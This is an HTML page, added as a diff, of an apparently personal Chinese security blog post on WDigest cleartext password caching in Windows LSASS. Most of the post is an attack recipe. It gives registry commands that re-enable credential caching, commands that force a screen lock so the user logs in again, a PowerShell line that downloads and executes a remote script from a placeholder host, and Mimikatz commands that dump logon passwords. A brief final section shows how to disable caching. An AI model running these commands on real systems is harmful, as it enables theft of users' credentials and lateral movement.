@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:lzz]">
+<meta name="description" content="wdigest概述 windows可以看作是一个SSO，WDigest.dll从Windows XP引入，目的是为了把明文密码存在lsass里进行重复认证，从而减少用户输入密码的次数。并且无论是否使用它，都会将其存储在内存中。
+老版本的系统打了补丁KB2871997，可以修改注册表禁用WDigest协议。
+原理 在Windows Server2012及其以后的版本中，系统默认禁用Wdigest Auth，lsass进程不再保存明文口令。Mimikatz也就读不到密码明文，这是微软为了防止内存中泄露明文密码做的一个安全措施。
+但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的（开启后，需要用户重新登录/锁屏重新输入密码生效）。
+修改注册表，然后使用cmd锁屏/重启让用户重新登陆使mimikatz可以读取明文密码。
+ 开启wdigest Auth读取明文密码 启用或者禁用WDigest修改注册表位置:
+HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest
+UseLogonCredential值设置为0, WDigest不把凭证缓存在内存，mimiktaz抓不到明文； UseLogonCredential 值设置为 1, WDigest把凭证缓存在内存，mimiktaz可以获取到明文。 cmd:
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+powershell:
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
+meterpreter
+reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogon
+强制锁屏让用户输入密码/重启 ====cmd==== rundll32 user32.dll,LockWorkStation ====Powershell==== Function Lock-WorkStation { $signature = @&amp;#34; [DllImport(&amp;#34;user32.dll&amp;#34;, SetLastError = true)] public static extern bool LockWorkStation(); &amp;#34;@ $LockWorkStation = Add-Type -memberDefinition $signature -name &amp;#34;Win32LockWorkStation&amp;#34; -namespace Win32Functions -passthru $LockWorkStation::LockWorkStation() | Out-Null } Lock-WorkStation powershell -c “IEX (New-Object Net." />
+<meta name="keywords" content="homepage, blog, science, informatics, development, programming, tips" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://lzzbb.github.io/posts/2021/06/wdigest/" />
+
+
+    <title>
+        
+            wdigest :: lzzzzzzz 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://lzzbb.github.io/main.2461b42f711aae674dd78e353275891fa072d7bf2ea9fbd577297a99dde78461.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://lzzbb.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://lzzbb.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://lzzbb.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://lzzbb.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://lzzbb.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://lzzbb.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="wdigest">
+<meta itemprop="description" content="wdigest概述 windows可以看作是一个SSO，WDigest.dll从Windows XP引入，目的是为了把明文密码存在lsass里进行重复认证，从而减少用户输入密码的次数。并且无论是否使用它，都会将其存储在内存中。
+老版本的系统打了补丁KB2871997，可以修改注册表禁用WDigest协议。
+原理 在Windows Server2012及其以后的版本中，系统默认禁用Wdigest Auth，lsass进程不再保存明文口令。Mimikatz也就读不到密码明文，这是微软为了防止内存中泄露明文密码做的一个安全措施。
+但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的（开启后，需要用户重新登录/锁屏重新输入密码生效）。
+修改注册表，然后使用cmd锁屏/重启让用户重新登陆使mimikatz可以读取明文密码。
+ 开启wdigest Auth读取明文密码 启用或者禁用WDigest修改注册表位置:
+HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest
+UseLogonCredential值设置为0, WDigest不把凭证缓存在内存，mimiktaz抓不到明文； UseLogonCredential 值设置为 1, WDigest把凭证缓存在内存，mimiktaz可以获取到明文。 cmd:
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+powershell:
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
+meterpreter
+reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogon
+强制锁屏让用户输入密码/重启 ====cmd==== rundll32 user32.dll,LockWorkStation ====Powershell==== Function Lock-WorkStation { $signature = @&#34; [DllImport(&#34;user32.dll&#34;, SetLastError = true)] public static extern bool LockWorkStation(); &#34;@ $LockWorkStation = Add-Type -memberDefinition $signature -name &#34;Win32LockWorkStation&#34; -namespace Win32Functions -passthru $LockWorkStation::LockWorkStation() | Out-Null } Lock-WorkStation powershell -c “IEX (New-Object Net."><meta itemprop="datePublished" content="2021-06-17T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-05-20T21:46:30+08:00" />
+<meta itemprop="wordCount" content="122"><meta itemprop="image" content="https://lzzbb.github.io/"/>
+<meta itemprop="keywords" content="tips," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://lzzbb.github.io/"/>
+
+<meta name="twitter:title" content="wdigest"/>
+<meta name="twitter:description" content="wdigest概述 windows可以看作是一个SSO，WDigest.dll从Windows XP引入，目的是为了把明文密码存在lsass里进行重复认证，从而减少用户输入密码的次数。并且无论是否使用它，都会将其存储在内存中。
+老版本的系统打了补丁KB2871997，可以修改注册表禁用WDigest协议。
+原理 在Windows Server2012及其以后的版本中，系统默认禁用Wdigest Auth，lsass进程不再保存明文口令。Mimikatz也就读不到密码明文，这是微软为了防止内存中泄露明文密码做的一个安全措施。
+但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的（开启后，需要用户重新登录/锁屏重新输入密码生效）。
+修改注册表，然后使用cmd锁屏/重启让用户重新登陆使mimikatz可以读取明文密码。
+ 开启wdigest Auth读取明文密码 启用或者禁用WDigest修改注册表位置:
+HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest
+UseLogonCredential值设置为0, WDigest不把凭证缓存在内存，mimiktaz抓不到明文； UseLogonCredential 值设置为 1, WDigest把凭证缓存在内存，mimiktaz可以获取到明文。 cmd:
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+powershell:
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
+meterpreter
+reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogon
+强制锁屏让用户输入密码/重启 ====cmd==== rundll32 user32.dll,LockWorkStation ====Powershell==== Function Lock-WorkStation { $signature = @&#34; [DllImport(&#34;user32.dll&#34;, SetLastError = true)] public static extern bool LockWorkStation(); &#34;@ $LockWorkStation = Add-Type -memberDefinition $signature -name &#34;Win32LockWorkStation&#34; -namespace Win32Functions -passthru $LockWorkStation::LockWorkStation() | Out-Null } Lock-WorkStation powershell -c “IEX (New-Object Net."/>
+
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-06-17 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://lzzbb.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://lzzbb.github.io/posts">Posts</a></li><li><a href="https://lzzbb.github.io/tags/">Tags</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        One minute
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://lzzbb.github.io/posts/2021/06/wdigest/">wdigest</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h2 id="wdigest概述">wdigest概述</h2>
+<p>windows可以看作是一个SSO，WDigest.dll从Windows XP引入，目的是为了把明文密码存在lsass里进行重复认证，从而减少用户输入密码的次数。并且无论是否使用它，都会将其存储在内存中。</p>
+<p><strong>老版本的系统打了补丁KB2871997，可以修改注册表禁用WDigest协议。</strong></p>
+<h3 id="原理">原理</h3>
+<p><strong>在Windows Server2012及其以后的版本中，系统默认禁用Wdigest Auth，lsass进程不再保存明文口令。Mimikatz也就读不到密码明文，这是微软为了防止内存中泄露明文密码做的一个安全措施。</strong></p>
+<p><code>但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的（开启后，需要用户重新登录/锁屏重新输入密码生效）。</code></p>
+<p><code>修改注册表，然后使用cmd锁屏/重启让用户重新登陆使mimikatz可以读取明文密码。</code></p>
+<hr>
+<h3 id="开启wdigest-auth读取明文密码">开启wdigest Auth读取明文密码</h3>
+<p>启用或者禁用WDigest修改注册表位置:</p>
+<p><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">UseLogonCredential值设置为0, WDigest不把凭证缓存在内存，mimiktaz抓不到明文；
+</span></span><span class="line"><span class="cl">UseLogonCredential 值设置为 1, WDigest把凭证缓存在内存，mimiktaz可以获取到明文。
+</span></span></code></pre></div><p>cmd:</p>
+<p><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></p>
+<p>powershell:</p>
+<p><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</code></p>
+<p>meterpreter</p>
+<p><code>reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogon</code></p>
+<h3 id="强制锁屏让用户输入密码重启">强制锁屏让用户输入密码/重启</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">====cmd====
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">rundll32 user32.dll,LockWorkStation
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">====Powershell====
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Function Lock-WorkStation
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">$signature = @&#34;
+</span></span><span class="line"><span class="cl">[DllImport(&#34;user32.dll&#34;, SetLastError = true)]
+</span></span><span class="line"><span class="cl">public static extern bool LockWorkStation();
+</span></span><span class="line"><span class="cl">&#34;@
+</span></span><span class="line"><span class="cl">$LockWorkStation = Add-Type -memberDefinition $signature -name &#34;Win32LockWorkStation&#34; -namespace Win32Functions -passthru
+</span></span><span class="line"><span class="cl">$LockWorkStation::LockWorkStation() | Out-Null
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">Lock-WorkStation
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">powershell -c “IEX (New-Object Net.WebClient).DownloadString(‘https://x.x.x.x/Lock-WorkStation.ps1’);”
+</span></span></code></pre></div><h3 id="读取内存明文">读取内存明文</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mimikatz.exe log privilege::Debug sekurlsa::logonpasswords exit
+</span></span><span class="line"><span class="cl">type mimikatz.log | find /I “password”
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/wdigest/1.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/wdigest/2.jpg" alt=""></p>
+<h2 id="wdigest-禁用缓存">WDigest 禁用缓存</h2>
+<p>WDigest默认在win2008之前是默认启用的。但是在win2008之后的系统默认是关闭的。如果在win2008之前的系统上打了KB2871997补丁，那么就可以去启用或者禁用WDigest。</p>
+<p>在注册表中将UseLogonCredential值设置为0，或者使用命令:</p>
+<pre tabindex="0"><code>reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
+</code></pre>
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://lzzbb.github.io/tags/tips/">tips</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        122 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2021-06-17 08:00 &#43;0800
+        
+
+         
+          
+            
+              (Last updated: 2022-05-20 21:46 &#43;0800)
+            
+          
+        
+      </p>
+        <p>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit">
+            <circle cx="12" cy="12" r="4"></circle>
+            <line x1="1.05" y1="12" x2="7" y2="12"></line>
+            <line x1="17.01" y1="12" x2="22.96" y2="12"></line>
+          </svg>
+
+          <a href="https://github.com/coolbluemelvin/mlvn.io/commit/0b81056c455f426f87d0c9280966d549475e967f" target="_blank" rel="noopener">0b81056</a>
+          @ 2022-05-20
+        </p>
+    </div>
+
+    
+    <div class="pagination">
+        
+        <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+        </div>
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://lzzbb.github.io/posts/2021/06/hash%E7%99%BB%E9%99%86rdp/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">hash登陆RDP</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://lzzbb.github.io/posts/2021/04/%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E9%9D%A2/">
+                    <span class="button__text">委派利用面</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://lzzbb.github.io/bundle.min.a2c5b062c87998f04d1b5dfb6a89a1b2d79786c21d0cb63a05e8a2082984b64b77d80955e3b97eab17273775162ba372511b711fea2f7608f216e68a67bb22d6.js" integrity="sha512-osWwYsh5mPBNG137aomhsteXhsIdDLY6BeiiCCmEtkt32AlV47l&#43;qxcnN3UWK6NyURtxH&#43;ovdgjyFuaKZ7si1g=="></script>
+
+
+
+    </body>
+</html>
